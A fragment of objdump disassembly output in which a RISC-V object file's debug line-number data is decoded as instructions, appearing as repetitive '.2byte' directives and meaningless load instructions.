      7c:	0100                	.2byte	0x100
      7e:	04090103          	lb	sp,64(s2)
      82:	0100                	.2byte	0x100
      84:	08090103          	lb	sp,128(s2)
      88:	0100                	.2byte	0x100
      8a:	04090103          	lb	sp,64(s2)
      8e:	0100                	.2byte	0x100
      90:	04090303          	lb	t1,64(s2)
      94:	0100                	.2byte	0x100
      96:	04090103          	lb	sp,64(s2)
      9a:	0100                	.2byte	0x100
      9c:	04090303          	lb	t1,64(s2)
      a0:	0100                	.2byte	0x100
      a2:	04090103          	lb	sp,64(s2)
      a6:	0100                	.2byte	0x100
      a8:	04090103          	lb	sp,64(s2)
      ac:	0100                	.2byte	0x100
      ae:	04090103          	lb	sp,64(s2)
      b2:	0100                	.2byte	0x100
      b4:	04090103          	lb	sp,64(s2)
      b8:	0100                	.2byte	0x100
      ba:	04090103          	lb	sp,64(s2)
      be:	0100                	.2byte	0x100
      c0:	04090103          	lb	sp,64(s2)
      c4:	0100                	.2byte	0x100
      c6:	04090103          	lb	sp,64(s2)
      ca:	0100                	.2byte	0x100
      cc:	04090103          	lb	sp,64(s2)
      d0:	0100                	.2byte	0x100
      d2:	04090103          	lb	sp,64(s2)
      d6:	0100                	.2byte	0x100
      d8:	04090103          	lb	sp,64(s2)
      dc:	0100                	.2byte	0x100
      de:	04090103          	lb	sp,64(s2)
      e2:	0100                	.2byte	0x100
      e4:	04090103          	lb	sp,64(s2)
      e8:	0100                	.2byte	0x100
      ea:	04090103          	lb	sp,64(s2)
      ee:	0100                	.2byte	0x100
      f0:	04090103          	lb	sp,64(s2)
      f4:	0100                	.2byte	0x100
      f6:	04090103          	lb	sp,64(s2)
      fa:	0100                	.2byte	0x100
      fc:	04090103          	lb	sp,64(s2)
     100:	0100                	.2byte	0x100
     102:	04090103          	lb	sp,64(s2)
     106:	0100                	.2byte	0x100
     108:	04090103          	lb	sp,64(s2)
     10c:	0100                	.2byte	0x100
     10e:	04090103          	lb	sp,64(s2)
     112:	0100                	.2byte	0x100
     114:	04090103          	lb	sp,64(s2)
     118:	0100                	.2byte	0x100
     11a:	04090103          	lb	sp,64(s2)
     11e:	0100                	.2byte	0x100
     120:	04090103          	lb	sp,64(s2)
     124:	0100                	.2byte	0x100
     126:	04090103          	lb	sp,64(s2)
     12a:	0100                	.2byte	0x100
     12c:	04090103          	lb	sp,64(s2)
     130:	0100                	.2byte	0x100
     132:	04090103          	lb	sp,64(s2)
     136:	0100                	.2byte	0x100
     138:	04090103          	lb	sp,64(s2)
     13c:	0100                	.2byte	0x100
     13e:	04090103          	lb	sp,64(s2)
     142:	0100                	.2byte	0x100
     144:	04090103          	lb	sp,64(s2)
     148:	0100                	.2byte	0x100
     14a:	04090103          	lb	sp,64(s2)
     14e:	0100                	.2byte	0x100
     150:	04090103          	lb	sp,64(s2)
     154:	0100                	.2byte	0x100
     156:	04090203          	lb	tp,64(s2)
     15a:	0100                	.2byte	0x100
     15c:	04090103          	lb	sp,64(s2)
     160:	0100                	.2byte	0x100
     162:	04090203          	lb	tp,64(s2)
     166:	0100                	.2byte	0x100
     168:	08090103          	lb	sp,128(s2)
     16c:	0100                	.2byte	0x100
     16e:	04090103          	lb	sp,64(s2)
     172:	0100                	.2byte	0x100
     174:	04090103          	lb	sp,64(s2)
     178:	0100                	.2byte	0x100
     17a:	04090103          	lb	sp,64(s2)
     17e:	0100                	.2byte	0x100
     180:	04090103          	lb	sp,64(s2)
     184:	0100                	.2byte	0x100
     186:	04090103          	lb	sp,64(s2)
     18a:	0100                	.2byte	0x100
     18c:	04090103          	lb	sp,64(s2)
     190:	0100                	.2byte	0x100
     192:	04090103          	lb	sp,64(s2)
     196:	0100                	.2byte	0x100
     198:	04090103          	lb	sp,64(s2)
     19c:	0100                	.2byte	0x100
     19e:	04090103          	lb	sp,64(s2)
     1a2:	0100                	.2byte	0x100
     1a4:	04090103          	lb	sp,64(s2)
     1a8:	0100                	.2byte	0x100
     1aa:	04090103          	lb	sp,64(s2)
     1ae:	0100                	.2byte	0x100
     1b0:	04090103          	lb	sp,64(s2)
     1b4:	0100                	.2byte	0x100
     1b6:	04090103          	lb	sp,64(s2)
     1ba:	0100                	.2byte	0x100
     1bc:	04090103          	lb	sp,64(s2)
     1c0:	0100                	.2byte	0x100
     1c2:	04090103          	lb	sp,64(s2)
     1c6:	0100                	.2byte	0x100
     1c8:	04090103          	lb	sp,64(s2)
     1cc:	0100                	.2byte	0x100
     1ce:	04090103          	lb	sp,64(s2)
     1d2:	0100                	.2byte	0x100
     1d4:	04090103          	lb	sp,64(s2)
     1d8:	0100                	.2byte	0x100
     1da:	04090103          	lb	sp,64(s2)
     1de:	0100                	.2byte	0x100
     1e0:	04090103          	lb	sp,64(s2)
     1e4:	0100                	.2byte	0x100
     1e6:	04090103          	lb	sp,64(s2)
     1ea:	0100                	.2byte	0x100
     1ec:	04090103          	lb	sp,64(s2)
     1f0:	0100                	.2byte	0x100
     1f2:	04090103          	lb	sp,64(s2)
     1f6:	0100                	.2byte	0x100
     1f8:	04090103          	lb	sp,64(s2)
     1fc:	0100                	.2byte	0x100
     1fe:	04090103          	lb	sp,64(s2)
     202:	0100                	.2byte	0x100
     204:	04090103          	lb	sp,64(s2)
     208:	0100                	.2byte	0x100
     20a:	04090103          	lb	sp,64(s2)
     20e:	0100                	.2byte	0x100
     210:	04090103          	lb	sp,64(s2)
     214:	0100                	.2byte	0x100
     216:	04090103          	lb	sp,64(s2)
     21a:	0100                	.2byte	0x100
     21c:	04090103          	lb	sp,64(s2)
     220:	0100                	.2byte	0x100
     222:	04090103          	lb	sp,64(s2)
     226:	0100                	.2byte	0x100
     228:	04090103          	lb	sp,64(s2)
     22c:	0100                	.2byte	0x100
     22e:	04090303          	lb	t1,64(s2)
     232:	0100                	.2byte	0x100
     234:	08090103          	lb	sp,128(s2)
     238:	0100                	.2byte	0x100
     23a:	04090103          	lb	sp,64(s2)
     23e:	0100                	.2byte	0x100
     240:	08090103          	lb	sp,128(s2)
     244:	0100                	.2byte	0x100
     246:	04090203          	lb	tp,64(s2)
     24a:	0100                	.2byte	0x100
     24c:	08090103          	lb	sp,128(s2)
     250:	0100                	.2byte	0x100
     252:	08090703          	lb	a4,128(s2)
     256:	0100                	.2byte	0x100
     258:	04090103          	lb	sp,64(s2)
     25c:	0100                	.2byte	0x100
     25e:	04090203          	lb	tp,64(s2)
     262:	0100                	.2byte	0x100
     264:	08090103          	lb	sp,128(s2)
     268:	0100                	.2byte	0x100
     26a:	04090203          	lb	tp,64(s2)
     26e:	0100                	.2byte	0x100
     270:	08090103          	lb	sp,128(s2)
     274:	0100                	.2byte	0x100
     276:	04090103          	lb	sp,64(s2)
     27a:	0100                	.2byte	0x100
     27c:	08090103          	lb	sp,128(s2)
     280:	0100                	.2byte	0x100
     282:	04090103          	lb	sp,64(s2)
     286:	0100                	.2byte	0x100
     288:	0409                	.2byte	0x409
     28a:	0000                	.2byte	0x0
     28c:	0101                	.2byte	0x101
     28e:	0900                	.2byte	0x900
     290:	0002                	.2byte	0x2
     292:	2000                	.2byte	0x2000
     294:	0080                	.2byte	0x80
     296:	0000                	.2byte	0x0
     298:	0300                	.2byte	0x300
     29a:	01a5                	.2byte	0x1a5
     29c:	0301                	.2byte	0x301
     29e:	0902                	.2byte	0x902
     2a0:	0008                	.2byte	0x8
     2a2:	0301                	.2byte	0x301
     2a4:	0901                	.2byte	0x901
     2a6:	0008                	.2byte	0x8
     2a8:	0901                	.2byte	0x901
     2aa:	0004                	.2byte	0x4
     2ac:	0100                	.2byte	0x100
     2ae:	aa01                	.2byte	0xaa01
     2b0:	0000                	.2byte	0x0
     2b2:	0500                	.2byte	0x500
     2b4:	0800                	.2byte	0x800
     2b6:	4000                	.2byte	0x4000
     2b8:	0000                	.2byte	0x0
     2ba:	0100                	.2byte	0x100
     2bc:	0101                	.2byte	0x101
     2be:	000d0efb          	.4byte	0xd0efb
     2c2:	0101                	.2byte	0x101
     2c4:	0101                	.2byte	0x101
     2c6:	0000                	.2byte	0x0
     2c8:	0100                	.2byte	0x100
     2ca:	0000                	.2byte	0x0
     2cc:	0101                	.2byte	0x101
     2ce:	1f01                	.2byte	0x1f01
     2d0:	0004                	.2byte	0x4
     2d2:	0000                	.2byte	0x0
     2d4:	3600                	.2byte	0x3600
     2d6:	0000                	.2byte	0x0
     2d8:	4c00                	.2byte	0x4c00
     2da:	0000                	.2byte	0x0
     2dc:	8b00                	.2byte	0x8b00
     2de:	0000                	.2byte	0x0
     2e0:	0200                	.2byte	0x200
     2e2:	1f01                	.2byte	0x1f01
     2e4:	0f02                	.2byte	0xf02
     2e6:	4604                	.2byte	0x4604
     2e8:	0000                	.2byte	0x0
     2ea:	0100                	.2byte	0x100
     2ec:	0046                	.2byte	0x46
     2ee:	0000                	.2byte	0x0
     2f0:	c601                	.2byte	0xc601
     2f2:	0000                	.2byte	0x0
     2f4:	0200                	.2byte	0x200
     2f6:	000000d7          	.4byte	0xd7
     2fa:	00110503          	lb	a0,1(sp)
     2fe:	0209                	.2byte	0x209
     300:	7048                	.2byte	0x7048
     302:	8000                	.2byte	0x8000
     304:	0000                	.2byte	0x0
     306:	0000                	.2byte	0x0
     308:	05010903          	lb	s2,80(sp)
     30c:	0902030f          	.4byte	0x902030f
     310:	000c                	.2byte	0xc
     312:	0301                	.2byte	0x301
     314:	0901                	.2byte	0x901
     316:	0008                	.2byte	0x8
     318:	0501                	.2byte	0x501
     31a:	0305                	.2byte	0x305
     31c:	0901                	.2byte	0x901
     31e:	000c                	.2byte	0xc
     320:	0501                	.2byte	0x501
     322:	030a                	.2byte	0x30a
     324:	0028090b          	.4byte	0x28090b
     328:	0501                	.2byte	0x501
     32a:	030d                	.2byte	0x30d
     32c:	0901                	.2byte	0x901
     32e:	0008                	.2byte	0x8
     330:	0501                	.2byte	0x501
     332:	033e                	.2byte	0x33e
     334:	0900                	.2byte	0x900
     336:	0008                	.2byte	0x8
     338:	0501                	.2byte	0x501
     33a:	030a                	.2byte	0x30a
     33c:	0900                	.2byte	0x900
     33e:	0004                	.2byte	0x4
     340:	0501                	.2byte	0x501
     342:	0305                	.2byte	0x305
     344:	0901                	.2byte	0x901
     346:	0008                	.2byte	0x8
     348:	0301                	.2byte	0x301
     34a:	0904                	.2byte	0x904
     34c:	0010                	.2byte	0x10
     34e:	0501                	.2byte	0x501
     350:	0301                	.2byte	0x301
     352:	0901                	.2byte	0x901
     354:	0004                	.2byte	0x4
     356:	0901                	.2byte	0x901
     358:	000c                	.2byte	0xc
     35a:	0100                	.2byte	0x100
     35c:	aa01                	.2byte	0xaa01
     35e:	000e                	.2byte	0xe
     360:	0500                	.2byte	0x500
     362:	0800                	.2byte	0x800
     364:	6500                	.2byte	0x6500
     366:	0000                	.2byte	0x0
     368:	0100                	.2byte	0x100
     36a:	0101                	.2byte	0x101
     36c:	000d0efb          	.4byte	0xd0efb
     370:	0101                	.2byte	0x101
     372:	0101                	.2byte	0x101
     374:	0000                	.2byte	0x0
     376:	0100                	.2byte	0x100
     378:	0000                	.2byte	0x0
     37a:	0101                	.2byte	0x101
     37c:	1f01                	.2byte	0x1f01
     37e:	00000007          	.4byte	0x7
     382:	3600                	.2byte	0x3600
     384:	0000                	.2byte	0x0
     386:	f000                	.2byte	0xf000
     388:	0000                	.2byte	0x0
     38a:	f400                	.2byte	0xf400
     38c:	0000                	.2byte	0x0
     38e:	4c00                	.2byte	0x4c00
     390:	0000                	.2byte	0x0
     392:	8b00                	.2byte	0x8b00
     394:	0000                	.2byte	0x0
     396:	2b00                	.2byte	0x2b00
     398:	0001                	.2byte	0x1
     39a:	0200                	.2byte	0x200
     39c:	1f01                	.2byte	0x1f01
     39e:	0f02                	.2byte	0xf02
     3a0:	e509                	.2byte	0xe509
     3a2:	0000                	.2byte	0x0
     3a4:	0100                	.2byte	0x100
     3a6:	0171                	.2byte	0x171
     3a8:	0000                	.2byte	0x0
     3aa:	e502                	.2byte	0xe502
     3ac:	0000                	.2byte	0x0
     3ae:	0100                	.2byte	0x100
     3b0:	0178                	.2byte	0x178
     3b2:	0000                	.2byte	0x0
     3b4:	0000c603          	lbu	a2,0(ra)
     3b8:	0400                	.2byte	0x400
     3ba:	000000d7          	.4byte	0xd7
     3be:	8005                	.2byte	0x8005
     3c0:	0001                	.2byte	0x1
     3c2:	0600                	.2byte	0x600
     3c4:	0189                	.2byte	0x189
     3c6:	0000                	.2byte	0x0
     3c8:	9206                	.2byte	0x9206
     3ca:	0001                	.2byte	0x1
     3cc:	0300                	.2byte	0x300
     3ce:	0105                	.2byte	0x105
     3d0:	0900                	.2byte	0x900
     3d2:	cc02                	.2byte	0xcc02
     3d4:	0070                	.2byte	0x70
     3d6:	0080                	.2byte	0x80
     3d8:	0000                	.2byte	0x0
     3da:	0300                	.2byte	0x300
     3dc:	0128                	.2byte	0x128
     3de:	1c090803          	lb	a6,448(s2)
     3e2:	0100                	.2byte	0x100
     3e4:	10090303          	lb	t1,256(s2)
     3e8:	0100                	.2byte	0x100
     3ea:	1c090803          	lb	a6,448(s2)
     3ee:	0100                	.2byte	0x100
     3f0:	10090303          	lb	t1,256(s2)
     3f4:	0100                	.2byte	0x100
     3f6:	0a05                	.2byte	0xa05
     3f8:	1c090303          	lb	t1,448(s2)
     3fc:	0100                	.2byte	0x100
     3fe:	0305                	.2byte	0x305
     400:	04090003          	lb	zero,64(s2)
     404:	0100                	.2byte	0x100
     406:	1205                	.2byte	0x1205
     408:	04090203          	lb	tp,64(s2)
     40c:	0100                	.2byte	0x100
     40e:	0905                	.2byte	0x905
     410:	10090003          	lb	zero,256(s2)
     414:	0100                	.2byte	0x100
     416:	2005                	.2byte	0x2005
     418:	08090003          	lb	zero,128(s2)
     41c:	0100                	.2byte	0x100
     41e:	1705                	.2byte	0x1705
     420:	14090003          	lb	zero,320(s2)
     424:	0100                	.2byte	0x100
     426:	1405                	.2byte	0x1405
     428:	08090103          	lb	sp,128(s2)
     42c:	0100                	.2byte	0x100
     42e:	0905                	.2byte	0x905
     430:	10090003          	lb	zero,256(s2)
     434:	0100                	.2byte	0x100
     436:	2405                	.2byte	0x2405
     438:	08090003          	lb	zero,128(s2)
     43c:	0100                	.2byte	0x100
     43e:	1905                	.2byte	0x1905
     440:	14090003          	lb	zero,320(s2)
     444:	0100                	.2byte	0x100
     446:	0805                	.2byte	0x805
     448:	08090103          	lb	sp,128(s2)
     44c:	0100                	.2byte	0x100
     44e:	1b05                	.2byte	0x1b05
     450:	0200                	.2byte	0x200
     452:	0104                	.2byte	0x104
     454:	18090003          	lb	zero,384(s2)
     458:	0100                	.2byte	0x100
     45a:	0805                	.2byte	0x805
     45c:	10090103          	lb	sp,256(s2)
     460:	0100                	.2byte	0x100
     462:	1b05                	.2byte	0x1b05
     464:	0200                	.2byte	0x200
     466:	0104                	.2byte	0x104
     468:	18090003          	lb	zero,384(s2)
     46c:	0100                	.2byte	0x100
     46e:	0200                	.2byte	0x200
     470:	0204                	.2byte	0x204
     472:	10097b03          	.4byte	0x10097b03
     476:	0100                	.2byte	0x100
     478:	1405                	.2byte	0x1405
     47a:	0200                	.2byte	0x200
     47c:	0104                	.2byte	0x104
     47e:	0c090003          	lb	zero,192(s2)
     482:	0100                	.2byte	0x100
     484:	1605                	.2byte	0x1605
     486:	0200                	.2byte	0x200
     488:	0104                	.2byte	0x104
     48a:	14090003          	lb	zero,320(s2)
     48e:	0100                	.2byte	0x100
     490:	1105                	.2byte	0x1105
     492:	0200                	.2byte	0x200
     494:	0104                	.2byte	0x104
     496:	08090003          	lb	zero,128(s2)
     49a:	0100                	.2byte	0x100
     49c:	0d05                	.2byte	0xd05
     49e:	0c090703          	lb	a4,192(s2)
     4a2:	0100                	.2byte	0x100
     4a4:	0605                	.2byte	0x605
     4a6:	0c090003          	lb	zero,192(s2)
     4aa:	0100                	.2byte	0x100
     4ac:	1905                	.2byte	0x1905
     4ae:	0200                	.2byte	0x200
     4b0:	0104                	.2byte	0x104
     4b2:	04090003          	lb	zero,64(s2)
     4b6:	0100                	.2byte	0x100
     4b8:	2805                	.2byte	0x2805
     4ba:	0200                	.2byte	0x200
     4bc:	0104                	.2byte	0x104
     4be:	1c090003          	lb	zero,448(s2)
     4c2:	0100                	.2byte	0x100
     4c4:	1f05                	.2byte	0x1f05
     4c6:	0200                	.2byte	0x200
     4c8:	0104                	.2byte	0x104
     4ca:	14090003          	lb	zero,320(s2)
     4ce:	0100                	.2byte	0x100
     4d0:	1205                	.2byte	0x1205
     4d2:	0200                	.2byte	0x200
     4d4:	0104                	.2byte	0x104
     4d6:	04090003          	lb	zero,64(s2)
     4da:	0100                	.2byte	0x100
     4dc:	0c05                	.2byte	0xc05
     4de:	08090103          	lb	sp,128(s2)
     4e2:	0100                	.2byte	0x100
     4e4:	0a05                	.2byte	0xa05
     4e6:	08090103          	lb	sp,128(s2)
     4ea:	0100                	.2byte	0x100
     4ec:	0105                	.2byte	0x105
     4ee:	04090103          	lb	sp,64(s2)
     4f2:	0100                	.2byte	0x100
     4f4:	10090303          	lb	t1,256(s2)
     4f8:	0100                	.2byte	0x100
     4fa:	0a05                	.2byte	0xa05
     4fc:	1c090303          	lb	t1,448(s2)
     500:	0100                	.2byte	0x100
     502:	0305                	.2byte	0x305
     504:	04090003          	lb	zero,64(s2)
     508:	0100                	.2byte	0x100
     50a:	1505                	.2byte	0x1505
     50c:	04090203          	lb	tp,64(s2)
     510:	0100                	.2byte	0x100
     512:	0c05                	.2byte	0xc05
     514:	10090003          	lb	zero,256(s2)
     518:	0100                	.2byte	0x100
     51a:	2305                	.2byte	0x2305
     51c:	08090003          	lb	zero,128(s2)
     520:	0100                	.2byte	0x100
     522:	1a05                	.2byte	0x1a05
     524:	14090003          	lb	zero,320(s2)
     528:	0100                	.2byte	0x100
     52a:	1705                	.2byte	0x1705
     52c:	08090103          	lb	sp,128(s2)
     530:	0100                	.2byte	0x100
     532:	0c05                	.2byte	0xc05
     534:	10090003          	lb	zero,256(s2)
     538:	0100                	.2byte	0x100
     53a:	2705                	.2byte	0x2705
     53c:	08090003          	lb	zero,128(s2)
     540:	0100                	.2byte	0x100
     542:	1c05                	.2byte	0x1c05
     544:	14090003          	lb	zero,320(s2)
     548:	0100                	.2byte	0x100
     54a:	1205                	.2byte	0x1205
     54c:	08090103          	lb	sp,128(s2)
     550:	0100                	.2byte	0x100
     552:	0905                	.2byte	0x905
     554:	14090003          	lb	zero,320(s2)
     558:	0100                	.2byte	0x100
     55a:	2205                	.2byte	0x2205
     55c:	04090003          	lb	zero,64(s2)
     560:	0100                	.2byte	0x100
     562:	1905                	.2byte	0x1905
     564:	14090003          	lb	zero,320(s2)
     568:	0100                	.2byte	0x100
     56a:	0f05                	.2byte	0xf05
     56c:	04090103          	lb	sp,64(s2)
     570:	0100                	.2byte	0x100
     572:	0805                	.2byte	0x805
     574:	14090003          	lb	zero,320(s2)
     578:	0100                	.2byte	0x100
     57a:	1f05                	.2byte	0x1f05
     57c:	0200                	.2byte	0x200
     57e:	0104                	.2byte	0x104
     580:	04090003          	lb	zero,64(s2)
     584:	0100                	.2byte	0x100
     586:	2105                	.2byte	0x2105
     588:	0200                	.2byte	0x200
     58a:	0104                	.2byte	0x104
     58c:	0c090003          	lb	zero,192(s2)
     590:	0100                	.2byte	0x100
     592:	1b05                	.2byte	0x1b05
     594:	0200                	.2byte	0x200
     596:	0204                	.2byte	0x204
     598:	10097b03          	.4byte	0x10097b03
     59c:	0100                	.2byte	0x100
     59e:	1405                	.2byte	0x1405
     5a0:	0200                	.2byte	0x200
     5a2:	0104                	.2byte	0x104
     5a4:	0c090003          	lb	zero,192(s2)
     5a8:	0100                	.2byte	0x100
     5aa:	1605                	.2byte	0x1605
     5ac:	0200                	.2byte	0x200
     5ae:	0104                	.2byte	0x104
     5b0:	14090003          	lb	zero,320(s2)
     5b4:	0100                	.2byte	0x100
     5b6:	1105                	.2byte	0x1105
     5b8:	0200                	.2byte	0x200
     5ba:	0104                	.2byte	0x104
     5bc:	08090003          	lb	zero,128(s2)
     5c0:	0100                	.2byte	0x100
     5c2:	0d05                	.2byte	0xd05
     5c4:	0c090703          	lb	a4,192(s2)
     5c8:	0100                	.2byte	0x100
     5ca:	0605                	.2byte	0x605
     5cc:	0c090003          	lb	zero,192(s2)
     5d0:	0100                	.2byte	0x100
     5d2:	1905                	.2byte	0x1905
     5d4:	0200                	.2byte	0x200
     5d6:	0104                	.2byte	0x104
     5d8:	04090003          	lb	zero,64(s2)
     5dc:	0100                	.2byte	0x100
     5de:	2805                	.2byte	0x2805
     5e0:	0200                	.2byte	0x200
     5e2:	0104                	.2byte	0x104
     5e4:	18090003          	lb	zero,384(s2)
     5e8:	0100                	.2byte	0x100
     5ea:	1205                	.2byte	0x1205
     5ec:	0200                	.2byte	0x200
     5ee:	0104                	.2byte	0x104
     5f0:	18090003          	lb	zero,384(s2)
     5f4:	0100                	.2byte	0x100
     5f6:	0c05                	.2byte	0xc05
     5f8:	08090103          	lb	sp,128(s2)
     5fc:	0100                	.2byte	0x100
     5fe:	0a05                	.2byte	0xa05
     600:	08090103          	lb	sp,128(s2)
     604:	0100                	.2byte	0x100
     606:	0105                	.2byte	0x105
     608:	04090103          	lb	sp,64(s2)
     60c:	0100                	.2byte	0x100
     60e:	10090303          	lb	t1,256(s2)
     612:	0100                	.2byte	0x100
     614:	0305                	.2byte	0x305
     616:	14090503          	lb	a0,320(s2)
     61a:	0100                	.2byte	0x100
     61c:	1105                	.2byte	0x1105
     61e:	04090203          	lb	tp,64(s2)
     622:	0100                	.2byte	0x100
     624:	0f05                	.2byte	0xf05
     626:	10090003          	lb	zero,256(s2)
     62a:	0100                	.2byte	0x100
     62c:	0705                	.2byte	0x705
     62e:	04090103          	lb	sp,64(s2)
     632:	0100                	.2byte	0x100
     634:	3005                	.2byte	0x3005
     636:	1c090003          	lb	zero,448(s2)
     63a:	0100                	.2byte	0x100
     63c:	0605                	.2byte	0x605
     63e:	0c090003          	lb	zero,192(s2)
     642:	0100                	.2byte	0x100
     644:	0b05                	.2byte	0xb05
     646:	04090203          	lb	tp,64(s2)
     64a:	0100                	.2byte	0x100
     64c:	0c090103          	lb	sp,192(s2)
     650:	0100                	.2byte	0x100
     652:	0d05                	.2byte	0xd05
     654:	14090203          	lb	tp,320(s2)
     658:	0100                	.2byte	0x100
     65a:	1405                	.2byte	0x1405
     65c:	0200                	.2byte	0x200
     65e:	0104                	.2byte	0x104
     660:	04090003          	lb	zero,64(s2)
     664:	0100                	.2byte	0x100
     666:	0305                	.2byte	0x305
     668:	18090303          	lb	t1,384(s2)
     66c:	0100                	.2byte	0x100
     66e:	0105                	.2byte	0x105
     670:	04090103          	lb	sp,64(s2)
     674:	0100                	.2byte	0x100
     676:	10090303          	lb	t1,256(s2)
     67a:	0100                	.2byte	0x100
     67c:	1a05                	.2byte	0x1a05
     67e:	10090103          	lb	sp,256(s2)
     682:	0100                	.2byte	0x100
     684:	1505                	.2byte	0x1505
     686:	08090003          	lb	zero,128(s2)
     68a:	0100                	.2byte	0x100
     68c:	0c05                	.2byte	0xc05
     68e:	08090003          	lb	zero,128(s2)
     692:	0100                	.2byte	0x100
     694:	0d05                	.2byte	0xd05
     696:	08090103          	lb	sp,128(s2)
     69a:	0100                	.2byte	0x100
     69c:	1a05                	.2byte	0x1a05
     69e:	08090003          	lb	zero,128(s2)
     6a2:	0100                	.2byte	0x100
     6a4:	1305                	.2byte	0x1305
     6a6:	08090003          	lb	zero,128(s2)
     6aa:	0100                	.2byte	0x100
     6ac:	0105                	.2byte	0x105
     6ae:	04090103          	lb	sp,64(s2)
     6b2:	0100                	.2byte	0x100
     6b4:	10090303          	lb	t1,256(s2)
     6b8:	0100                	.2byte	0x100
     6ba:	1b05                	.2byte	0x1b05
     6bc:	10090103          	lb	sp,256(s2)
     6c0:	0100                	.2byte	0x100
     6c2:	1605                	.2byte	0x1605
     6c4:	08090003          	lb	zero,128(s2)
     6c8:	0100                	.2byte	0x100
     6ca:	0c05                	.2byte	0xc05
     6cc:	08090003          	lb	zero,128(s2)
     6d0:	0100                	.2byte	0x100
     6d2:	0d05                	.2byte	0xd05
     6d4:	08090103          	lb	sp,128(s2)
     6d8:	0100                	.2byte	0x100
     6da:	1c05                	.2byte	0x1c05
     6dc:	08090003          	lb	zero,128(s2)
     6e0:	0100                	.2byte	0x100
     6e2:	1405                	.2byte	0x1405
     6e4:	08090003          	lb	zero,128(s2)
     6e8:	0100                	.2byte	0x100
     6ea:	0105                	.2byte	0x105
     6ec:	04090103          	lb	sp,64(s2)
     6f0:	0100                	.2byte	0x100
     6f2:	0204                	.2byte	0x204
     6f4:	097f9703          	lh	a4,151(t6)
     6f8:	0010                	.2byte	0x10
     6fa:	0501                	.2byte	0x501
     6fc:	0310                	.2byte	0x310
     6fe:	0902                	.2byte	0x902
     700:	0038                	.2byte	0x38
     702:	0301                	.2byte	0x301
     704:	0901                	.2byte	0x901
     706:	0008                	.2byte	0x8
     708:	0301                	.2byte	0x301
     70a:	0901                	.2byte	0x901
     70c:	0008                	.2byte	0x8
     70e:	0301                	.2byte	0x301
     710:	0901                	.2byte	0x901
     712:	0008                	.2byte	0x8
     714:	0501                	.2byte	0x501
     716:	09010303          	lb	t1,144(sp)
     71a:	0008                	.2byte	0x8
     71c:	0501                	.2byte	0x501
     71e:	030c                	.2byte	0x30c
     720:	0902                	.2byte	0x902
     722:	0004                	.2byte	0x4
     724:	0501                	.2byte	0x501
     726:	030a                	.2byte	0x30a
     728:	0900                	.2byte	0x900
     72a:	0004                	.2byte	0x4
     72c:	0501                	.2byte	0x501
     72e:	0309                	.2byte	0x309
     730:	0901                	.2byte	0x901
     732:	000c                	.2byte	0xc
     734:	0501                	.2byte	0x501
     736:	04020013          	add	zero,tp,64 # 40 <buf.4>
     73a:	0301                	.2byte	0x301
     73c:	0900                	.2byte	0x900
     73e:	0004                	.2byte	0x4
     740:	0501                	.2byte	0x501
     742:	030c                	.2byte	0x30c
     744:	0902                	.2byte	0x902
     746:	0010                	.2byte	0x10
     748:	0501                	.2byte	0x501
     74a:	09020303          	lb	t1,144(tp) # 90 <threadsense.2+0xc>
     74e:	000c                	.2byte	0xc
     750:	0501                	.2byte	0x501
     752:	09010313          	add	t1,sp,144
     756:	0004                	.2byte	0x4
     758:	0501                	.2byte	0x501
     75a:	0301                	.2byte	0x301
     75c:	0901                	.2byte	0x901
     75e:	0004                	.2byte	0x4
     760:	0301                	.2byte	0x301
     762:	00100903          	lb	s2,1(zero) # 1 <threadsense.5+0x1>
     766:	0501                	.2byte	0x501
     768:	0312                	.2byte	0x312
     76a:	0901                	.2byte	0x901
     76c:	0010                	.2byte	0x10
     76e:	0501                	.2byte	0x501
     770:	0318                	.2byte	0x318
     772:	0900                	.2byte	0x900
     774:	0008                	.2byte	0x8
     776:	0501                	.2byte	0x501
     778:	030a                	.2byte	0x30a
     77a:	0900                	.2byte	0x900
     77c:	0004                	.2byte	0x4
     77e:	0501                	.2byte	0x501
     780:	0009                	.2byte	0x9
     782:	0402                	.2byte	0x402
     784:	0301                	.2byte	0x301
     786:	0901                	.2byte	0x901
     788:	000c                	.2byte	0xc
     78a:	0501                	.2byte	0x501
     78c:	0301                	.2byte	0x301
     78e:	0904                	.2byte	0x904
     790:	0008                	.2byte	0x8
     792:	0501                	.2byte	0x501
     794:	09010303          	lb	t1,144(sp)
     798:	001c                	.2byte	0x1c
     79a:	0501                	.2byte	0x501
     79c:	0301                	.2byte	0x301
     79e:	0904                	.2byte	0x904
     7a0:	0008                	.2byte	0x8
     7a2:	0501                	.2byte	0x501
     7a4:	09010303          	lb	t1,144(sp)
     7a8:	0018                	.2byte	0x18
     7aa:	0501                	.2byte	0x501
     7ac:	0301                	.2byte	0x301
     7ae:	0904                	.2byte	0x904
     7b0:	000c                	.2byte	0xc
     7b2:	0501                	.2byte	0x501
     7b4:	09010303          	lb	t1,144(sp)
     7b8:	0010                	.2byte	0x10
     7ba:	0501                	.2byte	0x501
     7bc:	0301                	.2byte	0x301
     7be:	0904                	.2byte	0x904
     7c0:	0008                	.2byte	0x8
     7c2:	0501                	.2byte	0x501
     7c4:	09010303          	lb	t1,144(sp)
     7c8:	0018                	.2byte	0x18
     7ca:	0501                	.2byte	0x501
     7cc:	0301                	.2byte	0x301
     7ce:	0901                	.2byte	0x901
     7d0:	0024                	.2byte	0x24
     7d2:	0301                	.2byte	0x301
     7d4:	00180913          	add	s2,a6,1
     7d8:	0501                	.2byte	0x501
     7da:	030d                	.2byte	0x30d
     7dc:	0904                	.2byte	0x904
     7de:	0018                	.2byte	0x18
     7e0:	0501                	.2byte	0x501
     7e2:	0311                	.2byte	0x311
     7e4:	0900                	.2byte	0x900
     7e6:	0010                	.2byte	0x10
     7e8:	0501                	.2byte	0x501
     7ea:	0306                	.2byte	0x306
     7ec:	0902                	.2byte	0x902
     7ee:	0014                	.2byte	0x14
     7f0:	0501                	.2byte	0x501
     7f2:	001c                	.2byte	0x1c
     7f4:	0402                	.2byte	0x402
     7f6:	0301                	.2byte	0x301
     7f8:	0900                	.2byte	0x900
     7fa:	0010                	.2byte	0x10
     7fc:	0501                	.2byte	0x501
     7fe:	0012                	.2byte	0x12
     800:	0402                	.2byte	0x402
     802:	0301                	.2byte	0x301
     804:	0900                	.2byte	0x900
     806:	0004                	.2byte	0x4
     808:	0501                	.2byte	0x501
     80a:	0305                	.2byte	0x305
     80c:	0902                	.2byte	0x902
     80e:	000c                	.2byte	0xc
     810:	0501                	.2byte	0x501
     812:	030c                	.2byte	0x30c
     814:	0901                	.2byte	0x901
     816:	001c                	.2byte	0x1c
     818:	0501                	.2byte	0x501
     81a:	030a                	.2byte	0x30a
     81c:	00040903          	lb	s2,0(s0)
